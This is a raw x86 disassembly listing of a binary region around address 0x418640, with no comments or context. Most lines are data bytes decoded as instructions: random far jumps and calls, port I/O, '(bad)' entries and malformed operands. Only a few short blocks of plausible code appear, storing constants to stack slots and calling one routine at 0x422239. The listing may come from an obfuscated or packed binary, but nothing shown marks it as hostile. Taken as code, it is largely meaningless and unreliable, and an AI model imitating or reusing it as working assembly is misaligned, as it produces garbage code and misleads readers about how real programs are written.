  41863f:	out    0x95,al
  418641:	mov    edi,0x7a2726cc
  418646:	push   edx
  418647:	mov    bl,0x60
  418649:	jb     0x418623
  41864b:	push   ebp
  41864c:	mov    edi,0x8c3e9700
  418651:	jo     0x41869a
  418653:	or     al,0x26
  418655:	fidivr DWORD PTR [edx+0xf83884b]
  41865b:	inc    ecx
  41865c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41865d:	push   es
  41865e:	mov    DWORD PTR [ecx],esp
  418660:	xchg   ebp,eax
  418661:	sar    BYTE PTR [eax+0x4b69edf9],0x74
  418668:	outs   dx,DWORD PTR ds:[esi]
  418669:	inc    edi
  41866a:	test   DWORD PTR fs:[eax+eax*8+0x7],0x50e7a1c7
  418673:	jecxz  0x418687
  418675:	cmp    al,0x4c
  418677:	pop    ecx
  418678:	and    ch,dl
  41867a:	pop    edx
  41867b:	loop   0x4186fc
  41867d:	and    dh,dh
  41867f:	aad    0x54
  418681:	mov    edi,DWORD PTR [ebp+0x40]
  418684:	add    BYTE PTR [ebp-0x39],ah
  418687:	ja     0x4186c3
  418689:	loope  0x4186dc
  41868b:	ror    DWORD PTR [esi-0x442ca2fb],cl
  418691:	out    dx,al
  418692:	call   0x9575:0xe2aef8d9
  418699:	arpl   di,dx
  41869b:	fbld   TBYTE PTR [ebx-0x4fb87716]
  4186a1:	stos   DWORD PTR es:[edi],eax
  4186a2:	jmp    0x41867e
  4186a4:	fdivr  DWORD PTR [edx-0x13]
  4186a7:	cmp    ebx,ebp
  4186a9:	cs ss jp 0x418633
  4186ad:	scas   al,BYTE PTR es:[edi]
  4186ae:	jp     0x418660
  4186b0:	inc    ebp
  4186b1:	xor    edi,edi
  4186b3:	idiv   ebp
  4186b5:	mov    bl,0xf2
  4186b7:	jns    0x4186dc
  4186b9:	sub    BYTE PTR [ebx-0x80],bh
  4186bc:	sbb    ch,BYTE PTR [edi+0x51]
  4186bf:	mov    cl,0x62
  4186c1:	in     eax,dx
  4186c2:	scas   eax,DWORD PTR es:[edi]
  4186c3:	inc    esi
  4186c4:	retf   
  4186c5:	push   DWORD PTR [esp+eax*2]
  4186c8:	pop    ds
  4186c9:	and    BYTE PTR ds:0xf22fda0a,0xb6
  4186d0:	repnz mov eax,0x2cdbdaa6
  4186d6:	das    
  4186d7:	bnd jge 0x4186ab
  4186da:	dec    ecx
  4186db:	ins    BYTE PTR es:[edi],dx
  4186dc:	loopne 0x418753
  4186de:	nop
  4186df:	jmp    0xafee:0x609f23ff
  4186e6:	jnp    0x418743
  4186e8:	outs   dx,BYTE PTR ds:[esi]
  4186e9:	in     al,0xbe
  4186eb:	fnsave [esi-0x7ae9360b]
  4186f1:	das    
  4186f2:	and    eax,0xfbf03bd8
  4186f7:	inc    ebx
  4186f8:	cmp    edx,0x1af94a52
  4186fe:	in     eax,0x17
  418700:	cdq    
  418701:	xchg   ebp,eax
  418702:	add    eax,0x7ff52e3
  418707:	fistp  QWORD PTR [ebx]
  418709:	sub    bh,BYTE PTR [ebp+0x77]
  41870c:	(bad)  
  41870d:	icebp  
  41870e:	dec    edx
  41870f:	mov    edi,0x3ad7abe
  418714:	or     al,BYTE PTR [eax-0x1a121273]
  41871a:	push   esi
  41871b:	das    
  41871c:	je     0x4186fe
  41871e:	retf   
  41871f:	push   ecx
  418720:	fidiv  DWORD PTR [edi]
  418722:	jmp    0x41879c
  418724:	cwde   
  418725:	jmp    0x41877a
  418727:	call   0xc5be:0x20f3adaa
  41872e:	pop    ds
  41872f:	fs dec eax
  418731:	sbb    BYTE PTR [esi*1+0x4e6db903],ah
  418738:	mov    al,ds:0xf3522995
  41873d:	pop    es
  41873e:	aaa    
  41873f:	jl     0x4187aa
  418741:	dec    eax
  418742:	aam    0xef
  418744:	mov    eax,0xf30c19c0
  418749:	jmp    0x23d1:0x440fe1e
  418750:	stos   BYTE PTR es:[edi],al
  418751:	add    ah,bh
  418753:	rol    DWORD PTR [esi],cl
  418755:	pusha  
  418756:	dec    edx
  418757:	sbb    dl,ah
  418759:	ja     0x418710
  41875b:	mov    eax,ds:0xbcd293c2
  418760:	cmp    ecx,DWORD PTR [edi+0x12]
  418763:	and    bh,BYTE PTR [esi+0x23]
  418766:	les    edx,FWORD PTR [esi-0x5f]
  418769:	neg    BYTE PTR [edi]
  41876b:	test   BYTE PTR [edi+0x185ff80b],al
  418771:	scas   eax,DWORD PTR es:[edi]
  418772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418774:	bswap  ecx
  418776:	xor    ecx,DWORD PTR [edx-0x5eef39e5]
  41877c:	ret    
  41877d:	es push ds
  41877f:	loope  0x41877a
  418781:	or     esi,edi
  418783:	es mov esp,0xb7b8bc49
  418789:	addr16 and al,0xde
  41878c:	sub    al,0xbb
  41878e:	adc    DWORD PTR [esp+ecx*1-0x516c7076],0x50
  418796:	mov    ecx,DWORD PTR [ecx+edi*2-0x945d105]
  41879d:	dec    ebx
  41879e:	scas   eax,DWORD PTR es:[edi]
  41879f:	test   dl,al
  4187a1:	mov    cl,0x2d
  4187a3:	in     eax,0x41
  4187a5:	push   edx
  4187a6:	mov    esi,0x741872d2
  4187ab:	and    BYTE PTR [eax-0x3b],ch
  4187ae:	inc    edi
  4187af:	dec    eax
  4187b0:	xchg   DWORD PTR [edx],edx
  4187b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b3:	pop    ebx
  4187b4:	repnz pop edx
  4187b6:	(bad)  
  4187b7:	out    dx,al
  4187b8:	push   ebp
  4187b9:	add    eax,0xb8eaaeea
  4187be:	retf   0xb0c7
  4187c1:	dec    BYTE PTR [esi-0x6593c9bd]
  4187c7:	mov    ebx,0xdc507d1f
  4187cc:	cmp    dh,bl
  4187ce:	and    DWORD PTR [ebp-0x50],ebx
  4187d1:	mov    cl,0x79
  4187d3:	mov    esi,0xfbf63d89
  4187d8:	xor    al,BYTE PTR [eax+0x52]
  4187db:	enter  0x6a67,0x31
  4187df:	mov    DWORD PTR [eax+0x53],esi
  4187e2:	(bad)  
  4187e3:	in     al,dx
  4187e4:	or     esp,esi
  4187e6:	jns    0x4187ca
  4187e8:	ins    DWORD PTR es:[edi],dx
  4187e9:	fimul  WORD PTR [edx-0x4b]
  4187ec:	sbb    bl,BYTE PTR [edx+0x3b]
  4187ef:	xor    DWORD PTR [eax-0x5],edi
  4187f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f3:	add    BYTE PTR [esi],ch
  4187f5:	enter  0xca77,0x21
  4187f9:	and    DWORD PTR [ebp-0x6fe2f80c],ebx
  4187ff:	rcr    bh,1
  418801:	jle    0x4187d6
  418803:	neg    BYTE PTR [bp+si-0x2b]
  418807:	fsub   DWORD PTR [edi]
  418809:	(bad)  
  41880a:	in     eax,0x50
  41880c:	jecxz  0x4187d1
  41880e:	mov    WORD PTR [esi+eax*4],?
  418811:	shl    cl,0x5f
  418814:	pop    esi
  418815:	loopne 0x4187ee
  418817:	push   edi
  418818:	add    eax,0x3646
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi+0x2e50a190],ebx
  418894:	fst    QWORD PTR [ebx-0xd]
  418897:	sar    BYTE PTR [esi-0x41413dcb],0x85
  41889e:	xor    cl,BYTE PTR [eax+0x448e98c]
  4188a4:	push   cs
  4188a5:	adc    DWORD PTR [ecx+0x17df104c],0xeb9d6e21
  4188af:	sub    ebx,DWORD PTR [esi+0x13]
  4188b2:	daa    
  4188b3:	mov    eax,ds:0xbf679ef1
  4188b8:	mov    bl,0xe8
  4188ba:	pop    ebx
  4188bb:	sub    al,0x63
  4188bd:	lock inc ebx
  4188bf:	jne    0x4188e8
  4188c1:	add    eax,0xf69f25a
  4188c6:	dec    ebp
  4188c7:	xchg   esi,eax
  4188c8:	inc    esi
  4188c9:	push   DWORD PTR [ecx+0x7a]
  4188cc:	xchg   ebp,ecx
  4188ce:	xor    al,0x96
  4188d0:	test   al,0xa2
  4188d2:	gs jmp 0xc6d10448
  4188d8:	pop    esi
  4188d9:	adc    eax,DWORD PTR [edx-0x24]
  4188dc:	jae    0x418955
  4188de:	mov    edi,0x36157896
  4188e3:	adc    BYTE PTR [edi],dl
  4188e5:	into   
  4188e6:	mov    al,0xb8
  4188e8:	sub    eax,0x9e6b708f
  4188ed:	pushf  
  4188ee:	clc    
  4188ef:	push   edx
  4188f0:	in     eax,0x75
  4188f2:	sbb    DWORD PTR [ebx-0x3f],esi
  4188f5:	lea    edi,[edx+0x366d4ca1]
  4188fb:	inc    DWORD PTR [edi]
  4188fd:	adc    esp,DWORD PTR [edi-0x63f900c]
  418903:	xchg   ebx,eax
  418904:	outs   dx,BYTE PTR ds:[esi]
  418905:	inc    edi
  418906:	inc    ebp
  418907:	push   es
  418908:	std    
  418909:	in     al,dx
  41890a:	and    esi,DWORD PTR [ebx]
  41890c:	or     DWORD PTR [eax],edx
  41890e:	mov    eax,0x9415265e
  418913:	inc    esp
  418914:	sub    DWORD PTR [esi+ebp*8],0xffffffe9
  418918:	mov    edi,0xde602c3
  41891d:	cmc    
  41891e:	adc    eax,0xf4f8127
  418923:	pop    ss
  418924:	mov    bl,0x4e
  418926:	cmp    edi,0xee8b61d3
  41892c:	out    dx,al
  41892d:	call   FWORD PTR [bp+di+0x2a]
  418931:	imul   edi,DWORD PTR [edi-0x3bee063e],0x74c58ec6
  41893b:	xlat   BYTE PTR ds:[ebx]
  41893c:	inc    esp
  41893d:	push   esi
  41893e:	xor    al,0x6f
  418940:	adc    eax,0xb043a9f0
  418945:	jmp    DWORD PTR [esi+ebx*8-0x6df069fc]
  41894c:	mov    esp,0xff61a7c
  418951:	and    edx,DWORD PTR [ebp-0x66]
  418954:	add    eax,0x93550157
  418959:	clc    
  41895a:	mov    ch,BYTE PTR [esi+0x131e30b5]
  418960:	inc    ebx
  418961:	xlat   BYTE PTR ds:[ebx]
  418962:	out    0xa2,al
  418964:	out    dx,eax
  418965:	imul   edx,DWORD PTR [esi+ebx*1],0xcb173544
  41896c:	push   ebx
  41896d:	lods   eax,DWORD PTR ds:[esi]
  41896e:	ret    0x427b
  418971:	xchg   edx,eax
  418972:	neg    bl
  418974:	xor    DWORD PTR [ecx-0xbcb53f4],esp
  41897a:	loop   0x4189e1
  41897c:	ret    
  41897d:	add    eax,0x8c9bc4f0
  418982:	xor    al,0x63
  418984:	jbe    0x41893c
  418986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418987:	jbe    0x418a06
  418989:	in     eax,0x7d
  41898b:	sbb    ch,BYTE PTR [ebx]
  41898d:	repz mov dh,0x9
  418990:	pop    edx
  418991:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  418993:	ror    ch,cl
  418995:	scas   eax,DWORD PTR es:[edi]
  418996:	xor    al,0x6
  418998:	push   ds
  418999:	out    dx,al
  41899a:	(bad)  
  41899b:	pop    eax
  41899c:	out    dx,eax
  41899d:	shl    BYTE PTR [eax-0x47],cl
  4189a0:	cmp    ah,BYTE PTR ds:0x9f5eca9e
  4189a6:	data16 sar BYTE PTR [edx-0x36],0x13
  4189ab:	stos   DWORD PTR es:[edi],eax
  4189ac:	xlat   BYTE PTR ds:[ebx]
  4189ad:	mov    eax,0x5aabec95
  4189b2:	or     eax,0x6c81c4f2
  4189b7:	leave  
  4189b8:	adc    eax,0xfb7209f9
  4189bd:	mov    al,ds:0x427fa1c2
  4189c2:	cmp    eax,0xed14494a
  4189c7:	repz jmp 0x418951
  4189ca:	add    DWORD PTR [ebp+0x74478693],0xce913e0d
  4189d4:	(bad)  
  4189d5:	mov    ecx,0x4443f257
  4189da:	lahf   
  4189db:	mov    ds:0x889d900c,al
  4189e0:	js     0x4189a8
  4189e2:	sbb    BYTE PTR [ebp+edi*2+0x78],dl
  4189e6:	mov    ah,0xc9
  4189e8:	mov    cl,0x74
  4189ea:	pop    es
  4189eb:	mov    edi,0xdfa5474d
  4189f0:	test   al,0x5e
  4189f2:	in     eax,dx
  4189f3:	loopne 0x4189f9
  4189f5:	arpl   cx,si
  4189f7:	push   ebp
  4189f8:	xor    BYTE PTR [esi],dl
  4189fa:	or     esi,edx
  4189fc:	mov    eax,0x63b0bc6b
  418a01:	jae    0x418a77
  418a03:	(bad)  
  418a04:	inc    DWORD PTR [ecx+eax*2-0x3a]
  418a08:	mov    cl,0xa6
  418a0a:	mov    ah,0xd7
  418a0c:	push   ebx
  418a0d:	xor    al,BYTE PTR ds:0x99100d14
  418a13:	jle    0x418a0c
  418a15:	ret    
  418a16:	(bad)  
  418a17:	arpl   WORD PTR [esi],cx
  418a19:	hlt    
  418a1a:	jl     0x418a0a
  418a1c:	sub    eax,0x96a68291
  418a21:	jg     0x418a96
  418a23:	and    BYTE PTR [ebx+0x1144f68f],bl
  418a29:	popa   
  418a2a:	xor    esi,DWORD PTR [ebp+ebp*1+0x4232bb7d]
  418a31:	jmp    0x887:0x1e4c8eae
  418a38:	add    DWORD PTR [edx+0x19],edx
  418a3b:	lds    ebx,FWORD PTR [esi+0x20]
  418a3e:	dec    ebx
  418a3f:	dec    ebx
  418a40:	inc    esi
  418a41:	cs aam 0xa8
  418a44:	out    0xff,al
  418a46:	(bad)  
  418a47:	mov    eax,ds:0x477ae281
  418a4c:	inc    edx
  418a4d:	jns    0x418a2b
  418a4f:	(bad)  
  418a50:	hlt    
  418a51:	arpl   WORD PTR [ebp-0x495b466e],bx
  418a57:	cmp    ah,BYTE PTR [ebp*8+0x66445f0b]
  418a5e:	mov    al,0xa3
  418a60:	adc    eax,0x78c0d113
  418a65:	inc    eax
  418a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a67:	call   0x27b1:0x7ced2384
  418a6e:	ins    BYTE PTR es:[edi],dx
  418a6f:	sbb    al,BYTE PTR [edi-0x4ed4d130]
  418a75:	push   edx
  418a76:	aas    
  418a77:	jbe    0x418ada
  418a79:	neg    esi
  418a7b:	pushf  
  418a7c:	outs   dx,DWORD PTR ds:[esi]
  418a7d:	cli    
  418a7e:	cwde   
  418a7f:	sub    DWORD PTR [edx],edi
  418a81:	in     eax,dx
  418a82:	stos   DWORD PTR es:[edi],eax
  418a83:	push   cs
  418a84:	fdiv   DWORD PTR [ecx+edi*2-0x3d]
  418a88:	mov    cl,0x6a
  418a8a:	pop    esi
  418a8b:	popa   
  418a8c:	int3   
  418a8d:	inc    eax
  418a8e:	adc    bh,cl
  418a90:	ja     0x418afd
  418a92:	ins    DWORD PTR es:[edi],dx
  418a93:	jo     0x418a79
  418a95:	adc    al,0x6c
  418a97:	push   ecx
  418a98:	push   esp
  418a99:	cmp    ecx,DWORD PTR [eax+ecx*8]
  418a9c:	ret    0xc0f6
  418a9f:	test   eax,0x10514fd4
  418aa4:	in     al,0xc3
  418aa6:	fcmovnbe st,st(7)
  418aa8:	xchg   ebp,eax
  418aa9:	cmp    DWORD PTR [esi-0x18294747],0xac0d609e
  418ab3:	xor    DWORD PTR [ebx+0x7b],0xffffffa7
  418ab7:	mov    ch,0x55
  418ab9:	jge    0x418aeb
  418abb:	mov    ebx,DWORD PTR [ebx+0x62]
  418abe:	retf   0x8782
  418ac1:	push   ebx
  418ac2:	xchg   edx,eax
  418ac3:	jle    0x418a7b
  418ac5:	mov    cl,0x12
  418ac7:	cmp    dh,ch
  418ac9:	punpckhwd mm1,mm3
  418acc:	jno    0x418ac8
  418ace:	add    BYTE PTR [ebx-0x63443443],ch
  418ad4:	popf   
  418ad5:	sbb    ebx,DWORD PTR [esi+0x53]
  418ad8:	dec    ebx
  418ad9:	dec    ebx
  418ada:	jge    0x418b26
  418adc:	add    al,0x8b
  418ade:	inc    esp
  418adf:	and    al,0x10
  418ae1:	mov    ecx,DWORD PTR [esp+0x14]
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x422239
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x422239
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	mov    ebx,0xcb90a4b7
  418b2d:	test   eax,0xbec235be
  418b33:	mov    esi,0xc254915f
  418b38:	stos   BYTE PTR es:[edi],al
  418b39:	cld    
  418b3a:	loope  0x418b89
  418b3c:	dec    ebx
  418b3d:	(bad)  
  418b3e:	mov    al,ds:0x9a2b60c9
  418b43:	not    BYTE PTR ds:0x2a8cd95f
  418b49:	(bad)
  418b4d:	test   eax,0xf781bca4
  418b52:	aaa    
  418b53:	dec    edi
  418b54:	adc    BYTE PTR fs:[edx+edi*4+0x585793f],dh
  418b5c:	lds    esp,FWORD PTR [edx-0xd6a4232]
  418b62:	pushw  cs
  418b64:	xchg   ebx,eax
  418b65:	in     al,dx
  418b66:	in     eax,0x6b
  418b68:	sbb    al,0x7a
  418b6a:	mov    ah,0x54
  418b6c:	jl     0x418b73
  418b6e:	out    0x55,eax
  418b70:	cli    
  418b71:	cmp    al,0xbb
  418b73:	and    bl,BYTE PTR [ebx+0x2b]
  418b76:	retf   
  418b77:	jbe    0x418b09
  418b79:	adc    edx,ebx
  418b7b:	push   ebp
  418b7c:	adc    eax,0x1b418748
  418b81:	sub    al,0x16
  418b83:	arpl   WORD PTR [edx],bp
  418b85:	lods   al,BYTE PTR ds:[esi]
  418b86:	lods   eax,DWORD PTR ds:[esi]
  418b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b88:	mov    ebp,0x48e5fb20
  418b8d:	iret   
  418b8e:	pusha  
  418b8f:	and    bh,BYTE PTR [ecx+0x2113913]
  418b95:	data16 addr16 in al,dx
  418b98:	(bad)  
  418b99:	mov    edi,0xe2894d8a
  418b9e:	add    al,0xcb
  418ba0:	sti    
  418ba1:	pusha  
  418ba2:	add    cl,BYTE PTR [edi-0x79]
  418ba5:	enter  0xf00b,0x37
  418ba9:	in     al,dx
  418baa:	pop    edi
  418bab:	adc    ch,bl
  418bad:	mov    ds:0xf0928b38,eax
  418bb2:	fisttp DWORD PTR [eax-0x299a0ac0]
  418bb8:	adc    ch,BYTE PTR [edx*4-0x1ef65167]
  418bbf:	ja     0x418be5
  418bc1:	mov    ebp,edi
  418bc3:	and    BYTE PTR [esi+esi*4],al
  418bc6:	dec    eax
  418bc7:	xor    DWORD PTR ds:0x4c2dc420,ebp
  418bcd:	out    0x17,al
  418bcf:	sub    eax,0x126c6cbf
  418bd4:	stc    
  418bd5:	mov    cl,0xe3
  418bd7:	lock test DWORD PTR [ecx-0x27f2125c],ebx
  418bde:	hlt    
  418bdf:	jbe    0x418c24
  418be1:	imul   DWORD PTR [esi-0x61]
  418be4:	pop    ebx
  418be5:	ret    
  418be6:	mov    ecx,0x481f1fcb
  418beb:	sbb    al,0x96
  418bed:	in     eax,0xeb
  418bef:	ds dec eax
  418bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bf2:	lahf   
  418bf3:	out    dx,eax
  418bf4:	mov    gs,WORD PTR [ecx*4+0x7daeec0d]
  418bfb:	mov    BYTE PTR [ebx-0x2e9b4a70],bl
  418c01:	stos   BYTE PTR es:[edi],al
  418c02:	pop    ebp
  418c03:	adc    esp,DWORD PTR [esi]
  418c05:	gs in  al,dx
  418c07:	lds    edx,FWORD PTR [esp+ecx*1-0x33]
  418c0b:	sti    
  418c0c:	sub    al,0x13
  418c0e:	les    edi,FWORD PTR [edi-0xce117dc]
  418c14:	jmp    0x42954424
  418c19:	fcmovb st,st(6)
  418c1b:	jg     0x418bac
  418c1d:	sbb    al,0x28
  418c1f:	jbe    0x418c24
  418c21:	and    BYTE PTR [edi+0x220dafc3],0xa8
  418c28:	retf   0xb190
  418c2b:	sub    esi,DWORD PTR [ebp+0x7c]
  418c2e:	cli    
  418c2f:	cmp    edx,ebx
  418c31:	push   ecx
  418c32:	cmp    al,0xcf
  418c34:	test   eax,0xfadd4974
  418c39:	sar    BYTE PTR [edx+0x4d237327],cl
  418c3f:	mov    ss,WORD PTR [ebp-0xe]
  418c42:	xchg   ebx,eax
  418c43:	inc    esi
  418c44:	jmp    0x418c84
  418c46:	loopne 0x418cc1
  418c48:	ror    ecx,1
  418c4a:	lods   eax,DWORD PTR ds:[esi]
  418c4b:	shr    DWORD PTR [ecx-0x6],0xf9
  418c4f:	mov    edx,DWORD PTR [edx-0xb]
  418c52:	shl    BYTE PTR [edx+0x59],1
  418c55:	pop    esp
  418c56:	jmp    0xcbf3:0x9836a6a5
  418c5d:	gs and eax,esp
  418c60:	pop    ebx
  418c61:	aam    0xe2
  418c63:	mov    bl,0xad
  418c65:	adc    cl,BYTE PTR [ecx]
  418c67:	ins    BYTE PTR es:[edi],dx
  418c68:	shr    BYTE PTR [esi+0x3b3ce97a],0x93
  418c6f:	mov    ebx,DWORD PTR [esi-0x6f]
  418c72:	daa    
  418c73:	and    DWORD PTR [ebx-0x2150d586],edx
  418c79:	push   es
  418c7a:	push   0x23f504d7
  418c7f:	dec    esp
  418c80:	int    0x6
  418c82:	cmp    al,0xc2
  418c84:	push   esi
  418c85:	in     eax,dx
  418c86:	inc    ebx
  418c87:	xchg   ebp,edx
  418c89:	lahf   
  418c8a:	in     al,0x2f
  418c8c:	mov    ebx,0x70551400
  418c91:	inc    ebp
  418c92:	ins    DWORD PTR es:[edi],dx
  418c93:	(bad)  
  418c95:	(bad)  
  418c97:	and    dl,ch
  418c99:	inc    esp
  418c9a:	clc    
  418c9b:	add    bl,ch
  418c9d:	dec    edx
  418c9e:	pop    ecx
  418c9f:	(bad)  
  418ca0:	cs jne 0x418c33
  418ca3:	mov    ah,0xce
  418ca5:	xchg   edi,eax
  418ca6:	mov    bh,0x58
  418ca8:	ret    
  418ca9:	push   esp
  418caa:	call   0xb150ab2e
  418caf:	mov    ebp,0x63e293ee
  418cb4:	je     0x418d1d
  418cb6:	cdq    
  418cb7:	and    bh,BYTE PTR [edi]
  418cb9:	sub    DWORD PTR [ebp-0x11],eax
  418cbc:	(bad)  
  418cbd:	cmp    dh,dh
  418cbf:	sqrtps xmm2,XMMWORD PTR [edi-0x2a]
  418cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cc4:	cmp    ah,BYTE PTR [eax]
  418cc6:	jmp    0x203e:0xc46bbf24
  418ccd:	mov    BYTE PTR [edx-0x68],bh
  418cd0:	jmp    0xd15e:0x554a1347
  418cd7:	cs mov dl,0x61
  418cda:	(bad)  
  418cdb:	sahf   
  418cdc:	pushf  
  418cdd:	ds in  al,0x96
  418ce0:	jbe    0x418c7f
  418ce2:	sar    BYTE PTR [eax-0x70],1
  418ce5:	jmp    0x2a85:0x4989858f
  418cec:	inc    esp
  418ced:	arpl   WORD PTR [edi-0x6e8c26cf],si
  418cf3:	fs mov edx,0x6819bd7f
  418cf9:	bound  esi,QWORD PTR [ebx]
  418cfb:	mov    ebp,0xdf6aad37
  418d00:	cmp    dl,bl
  418d02:	frstor [esi+0x42]
  418d05:	pop    ebp
  418d06:	pop    ds
  418d07:	(bad)  
  418d08:	test   al,0xa0
  418d0a:	je     0x418d2d
  418d0c:	scas   eax,DWORD PTR es:[edi]
  418d0d:	mov    dh,0xb8
  418d0f:	cmp    ah,BYTE PTR [ebx]
  418d11:	lods   eax,DWORD PTR ds:[esi]
  418d12:	sub    DWORD PTR [edx],esp
  418d14:	inc    ebx
  418d15:	aad    0xe5
  418d17:	inc    eax
  418d18:	imul   esp,ecx,0xffffffc0
  418d1b:	ret    
  418d1c:	sub    al,0x3b
  418d1e:	cmp    al,0x51
  418d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d21:	jge    0x418cd5
  418d23:	jp     0x418ce1
  418d25:	dec    edi
  418d26:	jmp    0xb1a5383
  418d2b:	in     al,dx
  418d2c:	mov    esi,0xd0bbfc4d
  418d31:	push   0x43
  418d33:	cdq    
  418d34:	xchg   edx,eax
  418d35:	sahf   
  418d36:	fistp  DWORD PTR [edi+0x498955d5]
  418d3c:	(bad)  
  418d3d:	out    0xeb,al
  418d3f:	out    0x99,al
  418d41:	std    
  418d42:	mov    edi,0x44e0e2bb
  418d47:	push   ds
  418d48:	xchg   esp,eax
  418d49:	stos   BYTE PTR es:[edi],al
  418d4a:	jb     0x418cfc
  418d4c:	iret   
  418d4d:	xchg   esp,eax
  418d4e:	in     eax,dx
  418d4f:	or     cl,0x39
  418d52:	jge    0x418cf4
  418d54:	xchg   ebx,eax
  418d55:	mov    ?,WORD PTR [ecx-0x4bb75775]
  418d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d5c:	(bad)  
  418d5d:	out    dx,eax
  418d5e:	xor    BYTE PTR [ecx],0xf3
  418d61:	cmp    esi,edx
  418d63:	loope  0x418dd1
  418d65:	sbb    al,0x64
  418d67:	cmp    eax,0x61d6843c
  418d6c:	out    dx,al
  418d6d:	push   edx
  418d6e:	lds    esi,FWORD PTR [ebp*2+0x5349fadf]
  418d75:	push   ecx
  418d76:	push   edx
  418d77:	push   eax
  418d78:	call   0x422239
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0x6ef492a4
  418da4:	fld    QWORD PTR [ebx+edi*8-0x40]
  418da8:	mov    esi,0xbebec235
  418dad:	(bad)  
  418dae:	sahf   
  418daf:	test   DWORD PTR [edx+0x7496ec42],ecx
  418db5:	ins    BYTE PTR es:[edi],dx
  418db6:	jnp    0x418d89
  418db8:	mov    edx,0x82934071
  418dbd:	pop    ss
  418dbe:	in     eax,dx
  418dbf:	dec    ecx
  418dc0:	(bad)  
  418dc2:	(bad)  
  418dc3:	out    dx,eax
  418dc4:	and    al,0x22
  418dc6:	scas   al,BYTE PTR es:[edi]
  418dc7:	mov    ebp,0x33d67bfd
  418dcc:	test   BYTE PTR [ebp-0x56],bh
  418dcf:	xchg   DWORD PTR [edx],esp
  418dd1:	frstor [eax+0x2c929e81]
  418dd7:	int    0x13
  418dd9:	adc    ebx,DWORD PTR [edx+0x4c]
  418ddc:	adc    ch,0xec
  418ddf:	and    ecx,ebp
  418de1:	in     al,dx
  418de2:	ror    BYTE PTR [eax-0x43],0x6d
  418de6:	stos   DWORD PTR es:[edi],eax
  418de7:	push   cs
  418de8:	sbb    al,0xea
  418dea:	icebp  
  418deb:	rcr    bh,0xc0
  418dee:	cmp    eax,0x3cc78324
  418df3:	lods   al,BYTE PTR ds:[esi]
  418df4:	in     eax,0xd4
  418df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418df7:	jb     0x418de5
  418df9:	es (bad) 
  418dfb:	jne    0x418d95
  418dfd:	or     eax,0xb93fe0f2
  418e02:	in     al,0x63
  418e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e05:	pop    es
  418e06:	mov    edi,fs
  418e08:	mov    bh,0x30
  418e0a:	ins    BYTE PTR es:[edi],dx
  418e0b:	inc    edx
  418e0c:	ds xchg ecx,eax
  418e0e:	gs pusha 
  418e10:	retf   
  418e11:	mov    al,0xaf
  418e13:	mov    bh,0x6b
  418e15:	aas    
  418e16:	add    ebp,0xffffff8e
  418e19:	mov    al,0x7a
  418e1b:	mov    cl,0x94
  418e1d:	push   ecx
  418e1e:	inc    ebx
  418e1f:	xor    al,0x7b
  418e21:	das    
  418e22:	cmp    ebp,ebx
  418e24:	std    
  418e25:	int3   
  418e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e27:	popf   
  418e28:	mov    edi,0x6560bb36
  418e2d:	adc    ecx,0x396c3eea
  418e33:	cdq    
  418e34:	push   edx
  418e35:	dec    ebx
  418e36:	lea    esp,[edx+0x1f25646f]
  418e3c:	sub    bl,BYTE PTR [ebx-0x56]
  418e3f:	fmul   DWORD PTR [edi+edi*4-0x79]
  418e43:	jne    0x418e85
  418e45:	push   cs
  418e46:	lods   al,BYTE PTR ds:[esi]
  418e47:	add    eax,0x12a5bf38
  418e4c:	pop    edx
  418e4d:	inc    ebx
  418e4e:	ss aaa 
  418e50:	lds    ebx,FWORD PTR [ebx-0x3183640e]
